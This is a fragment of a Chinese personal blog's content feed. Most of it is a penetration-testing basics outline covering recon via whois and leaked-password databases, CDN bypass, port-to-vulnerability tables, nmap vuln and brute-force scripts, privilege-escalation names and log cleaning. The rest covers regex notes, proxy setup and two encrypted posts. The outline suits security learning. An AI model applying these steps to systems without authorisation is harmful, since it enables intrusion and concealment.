<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
<p><code>$</code>匹配行的结束标志</p>
<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
<h2 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h2>
<p>留坑待填</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>已安装程序（服务）的运行方式</title>
    <url>/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19MIQIpx6oNpCZxoarEm3ZG6YdFOAJEMiaYSX8NXyQReTAS8s4X9ucTzvPqZG4RBtp966EmPtalbkU2YxcyJ+8/Hz7I220s4PQETOmrJLkW/4xRO4U8y0RwkpEAvJ8ke2ZroFQwIfdJpIiWjDKbv7lsQVPVy8qgZE4nt9aP1eLg9TtDN18htmmyNcqV3oZ5agUNjeu1AqyYwWLNM9pJtg84ilYS4zH9yaO59RLev+HUCMjouesLmG4tRrFtU7O31RBzvNes4UQnR6pX62RYRQyYgCsX/rGv8zY1Y9qnN+Ou0uzkWkCkNgoSmbMHBPJG6jt+sXgtKcpuGd/kiYERmq505xHRcCuV0wDCXj/9dF7QCPT7pI5ZnX53GnAzOHu5qWZMwKEZgXruumgvqtnpw8vMP4CQuj7VItGMRbP3Tu6uAb6oBX0e+nzhE+HygwtFkxZU3Y7VhdyuyNTBBaYZkPNunCLLSeaWEjX7BHjKX78cF2jKTVN58iMQjAN/zqLoyJrbGOW/02zz7clZ5pryx5vdgaP9/qTNr8v0kmYGVlsbwurFA6o8vv6yNcUFEApCshT7OIkJV5pkNOcqRFZYkR79YQ75woF3718kxqF7cMLHFukViunPKp2IMUhRs5FoJJPOZ8Zquy0EY43BDzXwYTliLhLnZCgk6QP294q4WD5TU+a1FSDzdDbU4MEKZUQANXldEqNiPnHioHwjFyO4b1McYYMY+hQFz2HJ00btYIZMIroZNQkP1Pzhv3c7O07D2IzWXhRaJNQh5FYoLsBBh4bLLALCkX0i6tpXGQGFw0al7QSqVt2JCuSXu0EmLz/o6H9opdzHFjH6MBGsC4qXY6K2bLx0qb3eXGf37bmtTcTwC0yIwjL7zlYQpOH8Hm2h3Zj8K759GGrsTgE+fQd5AalpdmrBEKjjGLoA42xVufv8ePaiVMTV77TAcDSQL4PCoqWagUojtIgMJNkvCMCYoMiAuPaCh+M8KOuDV/d145R6sB33iEirM8KKK6oaxDFB6DWXTl1U3YvJ2eQ+gogPeP/KD/CEGaXDE8MEV6rXXIQgTH7P91z3sZteN0hmecANDfqHv/uPgxD/zTgNkwxN0IXznCdF6NPoA6lXDQsrWWRABSVTbcofETE+97ta8agJ6907jSIJlwRXUCrwB8QUpePHk1dpJlfS8ktVkMdjP6vQ4+Bv86QciltGbQIfIlcdAXg+hBoJY7xK7SNoaDTZke1GTVOrzj79r19HJwQ5O9BlHCH5nSoALMKkd0m4rTzTmkp36Ld6OcpcgK5GzHH2RprPQEhEzkuEWevP4fOUfAS7LOOAAK7I4C4XwLHCm0NZnw4XUUEO49lLgaL1NFZrk3zWMQb+3cQKCJnyXAH69t23tgLkxGPK5zZU+ZXpcluXWwQmSqd1/BH0qoYec/o73Iu1PCg04semxtU0Z6yXYdtfeg3jjO7VOHP7TccRfxj0V6OTYY62QqZT81kqeVfoDTVrsSn8rm2WTJNjbzS4m39wF2Pzbvs0TVT5v9cGHpYKG9GC3JnniJAU5dSkBNRkHkptOSt1tMe4sJ0YOvJjhdBMEjhgxM5QEKy8gbDAEe/W4vxqId+QW1tzgd34qK1VSb6DKgxB9fYSM3QMi+qDH3m7lxZPNZ0sb+WIbhL8OCSSvhk/Q0pYliDgzj5Pp0zQChmsLoBHPj4EAmw16+2tE+2xtaXk4Pe1yPuWgcHw6BtwLDXw/y36QfqCyXBpIt4qwhvEWqD8DCKext2vbzQW/dTdBHo/DubFXWHjT069RBNAeXDQlv/71qUemumIne7U0Io1jrzKgdxWpbviCP6HsRVcdAbnNe7FSdb9W8Gqr4yRvIlUKp3hIby14sXCD/YMq99kzCbOndQSC+fULUcW+jmgjVKhUZ+4lGr3YVwXUU74i3+1n4SoUJSxbVKI5Fiadl36NbJ/Q4Ug0OI+kYdzWpxQBmkZ5CoCTiO560AVw5tlMB5JxkVuShH/PWELpqYBkla0tzojdA4UocY9p3dn5+wdu+nO9hpwkMQAX+5GCuGaEV//+g9U/WsNrm1S/PITG1/SYmNwEzfFN3pVEjjLClat9ZtAEDIZ+9iLkRVBOW6mwOrOdoK/RSrB18puSdUtmyuscJ2QFg1DBTJd2wRS0xLPhuMG8xM1GHkNPcOf8oFK7PijGLt4debI5kfWUdrT2iKYK39dek/jbTuhJlx/f79gV+LDEneAkRFMOCiweQ9G4dsBsEYWkvZbyuTV2LZl2ucs5jefTvlfBgn/t1KrymEJFn10orbwCndkAVS/WOOqhwZu56+NZuSqfNRCVjvpC1OsyE8SVH0egviCifyhTz37Iz3x+4NOIpzIZMZQiYO0MX6eQHm51XzB+KjNGxh8BqH53b+Ja651PTRXlcyMSVVb2PLPC412GQYVYsdk3AKxfoqxpo1kin2zjjyj5m/MA4lDXA3c3ur9diOB+OP0FE8lMemtunZK9yz2v/xpB7oE3gipJdialBjWhM/uU4gsy/TsHYNI8EDMyUdkWs8qSpWRhqbTlnJU40/x4XPzNWtzIRJS95jPg0VCsolYBQhLzov6Y/W2kmnxjJfdKXOwe2zAT2dkqT6wqG5PJD3pXPg5+ekdTijOMyvg2rD9fYeQM59L85zvN7bUcrELHH593cwj2n+imtBZF4KKyqZqn6e4iGebo+3vdT1rFflKJpvbHf04SPeWmJwPLbWNV0Gx3L9/jLmv7l5JcMZlCQWG+oApWoih2qm3EqYY0g== </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试基础</title>
    <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="渗透思路-流程"><a class="header-anchor" href="#渗透思路-流程"></a>渗透思路/流程</h2>
<p><strong>信息收集</strong></p>
<p>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
<p>b、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p>
<p>c、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p>
<p>d、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</p>
<p>e、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p>
<p>f、google hack 进一步探测网站的信息，后台，敏感文件</p>
<p><strong>漏洞扫描</strong></p>
<p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
<p><strong>漏洞利用</strong></p>
<p>利用以上的方式拿到webshell，或者其他权限</p>
<p><strong>权限提升</strong></p>
<p>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
<p><strong>日志清理</strong></p>
<p>总结报告及修复方案</p>
<h2 id="资产搜集"><a class="header-anchor" href="#资产搜集"></a>资产搜集</h2>
<h3 id="子域名搜集"><a class="header-anchor" href="#子域名搜集"></a>子域名搜集</h3>
<ul>
<li>工具1：Layer子域名挖掘机5.0
<ul>
<li>支持服务接口、暴力搜索、同服挖掘三种模式</li>
<li>支持打开网站、复制域名、复制IP、复制CDN</li>
<li>支持导出检测结果等功能</li>
</ul>
</li>
<li>工具2：SubdomainsBurte
<ul>
<li><a href="https://github.com/y1ng1996/lijiejie_subDomainsBrute">https://github.com/y1ng1996/lijiejie_subDomainsBrute</a></li>
<li>暴力枚举，速度快</li>
</ul>
</li>
<li>网站：SSL证书查询\网络空间搜索引擎
<ul>
<li><a href="https://censys.io">censys</a></li>
<li><a href="https://crt.sh">crt.sh</a></li>
<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
<li><a href="https://www.shodan.io/">shodan</a></li>
<li><a href="https://fofa.so/">fofa</a></li>
</ul>
</li>
</ul>
<h3 id="绕过CDN找真实IP"><a class="header-anchor" href="#绕过CDN找真实IP"></a>绕过CDN找真实IP</h3>
<ul>
<li>网络空间搜索引擎
<ul>
<li><a href="https://www.zoomeye.org/">钟馗之眼</a></li>
<li><a href="https://www.webscan.cc/">webscan</a></li>
<li><a href="https://censys.io">censys</a></li>
<li><a href="https://www.shodan.io/">shodan</a></li>
<li><a href="https://www.dnsdb.io/zh-cn">全球DNS搜索引擎</a></li>
<li><a href="https://fofa.so/">fofa</a></li>
<li><a href="http://lookahead.surfwax.com/">Surfwax元搜索</a></li>
<li><a href="https://archive.org/web/">Way Back Machine</a></li>
</ul>
</li>
<li>让目标主动连接我们
<ul>
<li>RSS订阅</li>
<li>邮件服务器</li>
</ul>
</li>
</ul>
<h3 id="IP段整理"><a class="header-anchor" href="#IP段整理"></a>IP段整理</h3>
<ul>
<li>通过<a href="http://ipwhois.cnnic.net.cn/">中国互联网络信息中心</a>查询</li>
<li>纯真IP数据库</li>
</ul>
<h3 id="C段查询、旁站查询"><a class="header-anchor" href="#C段查询、旁站查询"></a>C段查询、旁站查询</h3>
<ul>
<li><a href="https://www.webscan.cc/">webscan</a></li>
</ul>
<h2 id="端口扫描及利用"><a class="header-anchor" href="#端口扫描及利用"></a>端口扫描及利用</h2>
<table>
<thead>
<tr>
<th>端口号</th>
<th>对应服务</th>
<th>端口号</th>
<th>对应服务</th>
</tr>
</thead>
<tbody>
<tr>
<td>21</td>
<td>ftp</td>
<td>2601 2604</td>
<td>zebra路由</td>
</tr>
<tr>
<td>22</td>
<td>ssh</td>
<td>3306</td>
<td>MySQL</td>
</tr>
<tr>
<td>23</td>
<td>telnet</td>
<td>3312</td>
<td>kangle主机管理系统</td>
</tr>
<tr>
<td>80</td>
<td>http</td>
<td>3389</td>
<td>远程桌面</td>
</tr>
<tr>
<td>80-89</td>
<td>web</td>
<td>4440</td>
<td>rundeck</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>5432</td>
<td>PostgreSQL</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
<td>5900</td>
<td>vnc</td>
</tr>
<tr>
<td>443</td>
<td>https（心脏滴血）</td>
<td>6379</td>
<td>redis未授权</td>
</tr>
<tr>
<td>445</td>
<td>SMB（永恒之蓝）</td>
<td>7001 7002</td>
<td>WebLogic默认弱口令，反序列</td>
</tr>
<tr>
<td>512 513 514</td>
<td>Rexec</td>
<td>8080</td>
<td>tomcat</td>
</tr>
<tr>
<td>873</td>
<td>Rsync未授权</td>
<td>8080 8089 9090</td>
<td>JBOSS</td>
</tr>
<tr>
<td>1025</td>
<td>NFS</td>
<td>8161</td>
<td>activemq未授权访问</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQL</td>
<td>27017 27018</td>
<td>Mongodb未授权访问</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle</td>
<td>50000</td>
<td>SAP命令执行</td>
</tr>
</tbody>
</table>
<p><strong>利用 nmap+脚本快速捡洞和检洞</strong></p>
<pre><code class="language-shell">系统漏洞检测：nmap --script smb-check-vulns.nse -p 192.168.1.1
数据库密码检测：nmap --script=brute 192.168.1.1
收集应用服务信息：nmap -sC 192.168.1.1
检测常见漏洞：nmap --script=vuln 192.168.1.1
检测部分应用的弱口令：nmap --script=auth 192.168.1.1
</code></pre>
<h2 id="指纹搜集"><a class="header-anchor" href="#指纹搜集"></a>指纹搜集</h2>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>网络代理设置</title>
    <url>/2021/07/08/%E6%9D%82%E8%AE%B0/%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="cmd-PowerShell代理设置"><a class="header-anchor" href="#cmd-PowerShell代理设置"></a>cmd/PowerShell代理设置</h2>
<p>设置命令行代理（设置环境变量,命令行关闭后则失效）</p>
<pre><code class="language-shell">set HTTP_PROXY=127.0.0.1:10809
set HTTPS_PROXY=127.0.0.1:10809
</code></pre>
<blockquote>
<p>ps：测试是否设置成功不要ping google，因为ping命令用的是ICMP协议；正确做法是</p>
<p>curl <a href="http://www.google.com">www.google.com</a></p>
</blockquote>
<h2 id="git代理设置"><a class="header-anchor" href="#git代理设置"></a>git代理设置</h2>
<p>设置永久有效</p>
<pre><code class="language-shell">git config --global https.proxy http://127.0.0.1:10809	
git config --global https.proxy https://127.0.0.1:10809
git config --global http.proxy 'socks5://127.0.0.1:10808'
git config --global https.proxy 'socks5://127.0.0.1:10808'
git config --global --list	#查询代理设置
</code></pre>
<h2 id="go代理设置"><a class="header-anchor" href="#go代理设置"></a>go代理设置</h2>
<p>方法1.配置命令行环境变量（临时）</p>
<p><strong>Bash (Linux or macOS)</strong></p>
<pre><code class="language-shell">export GOPROXY=https://goproxy.io,direct
</code></pre>
<p><strong>PowerShell (Windows)</strong></p>
<pre><code class="language-shell">$env:GOPROXY = &quot;https://goproxy.io,direct&quot;
</code></pre>
<p>方法2.配置用户环境变量</p>
<p><strong>Mac/Linux</strong></p>
<pre><code class="language-shell"># 设置你的 bash 环境变量
echo &quot;export GOPROXY=https://goproxy.io,direct&quot; &gt;&gt; ~/.profile &amp;&amp; source ~/.profile

# 如果你的终端是 zsh，使用以下命令
echo &quot;export GOPROXY=https://goproxy.io,direct&quot; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc
</code></pre>
<p><strong>Windows</strong></p>
<pre><code class="language-text">1. 右键 我的电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 环境变量
2. 在 “[你的用户名]的用户变量” 中点击 ”新建“ 按钮
3. 在 “变量名” 输入框并新增 “GOPROXY”
4. 在对应的 “变量值” 输入框中新增 “https://goproxy.io,direct”
5. 最后点击 “确定” 按钮保存设置
</code></pre>
<p>参考：<a href="https://blog.csdn.net/xiaobai_ol/article/details/106426199">https://blog.csdn.net/xiaobai_ol/article/details/106426199</a></p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
  </entry>
  <entry>
    <title>dark web</title>
    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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